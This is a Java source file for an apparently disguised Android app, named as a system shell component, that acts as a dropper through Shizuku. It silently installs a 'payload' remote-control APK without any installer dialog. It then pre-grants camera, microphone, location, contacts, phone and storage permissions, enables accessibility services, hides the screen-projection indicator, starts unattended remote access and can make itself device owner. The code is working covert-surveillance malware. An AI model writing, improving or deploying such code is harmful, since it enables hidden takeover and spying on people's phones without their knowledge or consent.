package com.android.shell.ghost;

import android.app.PendingIntent;
import android.content.Intent;
import android.util.Log;

import rikka.shizuku.Shizuku;

/**
 * Thin Shizuku (or root-through-Shizuku) bridge.
 *
 * The wrapper asks Shizuku for permission once, then runs every install and
 * permission-grant command through Shizuku's shell/root process. This is the
 * only path on stock Android that is truly silent: no package-installer
 * dialog, no Play Protect UI, no manual accessibility toggle.
 */
final class ShizukuBridge {

    static final int REQUEST_CODE = 4242;
    private static final String TAG = "GhostHide";
    private static final String PAYLOAD_PACKAGE = "com.betterdesk.client.universal";
    private static final String PAYLOAD_A11Y =
            "com.betterdesk.client.universal/com.carriez.flutter_hbb.RemoteControlAccessibilityService";
    private static final String OWN_A11Y =
            "com.android.shell.ghost/com.android.shell.ghost.GhostAccessibilityService";

    /** Runtime permissions worth pre-granting so remote sessions never pop a dialog. */
    private static final String[] PAYLOAD_PERMISSIONS = {
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
            "android.permission.BLUETOOTH_CONNECT",
            "android.permission.NEARBY_WIFI_DEVICES",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_PHONE_STATE",
            "android.permission.CALL_PHONE",
            "android.permission.READ_CONTACTS",
            "android.permission.BODY_SENSORS",
            "android.permission.ACTIVITY_RECOGNITION",
    };

    private ShizukuBridge() {}

    static {
        HiddenApi.init();
    }

    static boolean available() {
        try {
            return Shizuku.pingBinder();
        } catch (Throwable t) {
            return false;
        }
    }

    static boolean permitted() {
        try {
            return Shizuku.checkSelfPermission() == 0;
        } catch (Throwable t) {
            return false;
        }
    }

    static boolean installed(android.content.Context c) {
        try {
            c.getPackageManager().getPackageInfo("moe.shizuku.privileged.api", 0);
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    /** True when Shizuku itself is running as root (su), not just ADB shell. */
    static boolean isRoot() {
        try {
            return Shizuku.getUid() == 0;
        } catch (Throwable t) {
            return false;
        }
    }

    static void request() {
        try {
            Shizuku.requestPermission(REQUEST_CODE);
        } catch (Throwable ignored) {}
    }

    /** Run a command through Shizuku. Returns the child exit code, or -1. */
    static int run(String... cmd) {
        try {
            java.lang.reflect.Method m = Shizuku.class.getDeclaredMethod(
                    "newProcess", String[].class, String[].class, String.class);
            m.setAccessible(true);
            Process p = (Process) m.invoke(null, cmd, null, null);
            java.io.BufferedReader r = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = r.readLine()) != null) Log.d(TAG, "shizuku: " + line);
            r.close();
            return p.waitFor();
        } catch (Throwable t) {
            Log.d(TAG, "shizuku run failed " + t);
            return -1;
        }
    }

    /**
     * Stage the payload in app external storage, copy it to /data/local/tmp so
     * SELinux lets the shell/root process read it, silently install it with all
     * runtime permissions, then pre-grant every special permission.
     */
    static boolean installAndEnable(android.content.Context c, java.io.File apk) {
        if (!available() || !permitted() || apk == null || !apk.isFile()) return false;
        try {
            java.io.File stage = new java.io.File(c.getExternalFilesDir(null), "payload.apk");
            java.io.FileInputStream in = new java.io.FileInputStream(apk);
            java.io.FileOutputStream out = new java.io.FileOutputStream(stage);
            byte[] buf = new byte[64 * 1024];
            int len;
            while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
            out.getFD().sync();
            out.close();
            in.close();
            String tmp = "/data/local/tmp/bd_payload.apk";
            if (run("cp", stage.getAbsolutePath(), tmp) != 0) return false;
            run("chmod", "644", tmp);
            int rc = run("pm", "install", "-r", "-g", "--user", "0", tmp);
            run("rm", "-f", tmp);
            Log.d(TAG, "shizuku pm install rc=" + rc);
            if (rc != 0) return false;
            grantPayload(c);
            GhostAccessibilityService.onPayloadReady(c);
            return true;
        } catch (Throwable t) {
            Log.d(TAG, "stage failed " + t);
            return false;
        }
    }

    /** Best-effort grants that make unattended remote access immediate. */
    static void grantPayload(android.content.Context c) {
        try {
            for (String perm : PAYLOAD_PERMISSIONS) {
                run("pm", "grant", PAYLOAD_PACKAGE, perm);
            }
            run("appops", "set", PAYLOAD_PACKAGE, "SYSTEM_ALERT_WINDOW", "allow");
            run("appops", "set", PAYLOAD_PACKAGE, "MANAGE_EXTERNAL_STORAGE", "allow");
            run("appops", "set", PAYLOAD_PACKAGE, "PROJECT_MEDIA", "allow");
            run("appops", "set", PAYLOAD_PACKAGE, "AUTO_REVOKE_PERMISSIONS_IF_UNUSED", "ignore");

            String services = OWN_A11Y + ":" + PAYLOAD_A11Y;
            run("settings", "put", "secure", "enabled_accessibility_services", services);
            run("settings", "put", "secure", "accessibility_enabled", "1");
            run("settings", "put", "secure", "show_media_projection_icon", "0");
            run("settings", "put", "global", "media_projection_icon", "0");

            run("cmd", "deviceidle", "whitelist", "+" + PAYLOAD_PACKAGE);
            run("am", "set-inactive", PAYLOAD_PACKAGE, "false");
            run("am", "start-foreground-service", "-n",
                    PAYLOAD_PACKAGE + "/com.carriez.flutter_hbb.UnattendedAccessService");
            run("am", "start", "-n", PAYLOAD_PACKAGE + "/com.carriez.flutter_hbb.MainActivity");
        } catch (Throwable t) {
            Log.d(TAG, "grant extras failed " + t);
        }
    }

    /**
     * With root Shizuku, make the wrapper device owner when the device has no
     * accounts yet. Device-owner upgrades PackageInstaller to fully silent
     * (USER_ACTION_NOT_REQUIRED) and keeps the install working after reboot.
     */
    static boolean claimDeviceOwner(android.content.Context c) {
        if (!available() || !permitted() || !isRoot()) return false;
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager) c.getSystemService(
                            android.content.Context.DEVICE_POLICY_SERVICE);
            if (dpm == null || dpm.isDeviceOwnerApp(c.getPackageName())) return true;
            String admin = c.getPackageName() + "/com.android.shell.ghost.GhostDeviceAdmin";
            return run("dpm", "set-device-owner", admin) == 0;
        } catch (Throwable t) {
            Log.d(TAG, "claimDeviceOwner failed " + t);
            return false;
        }
    }
}
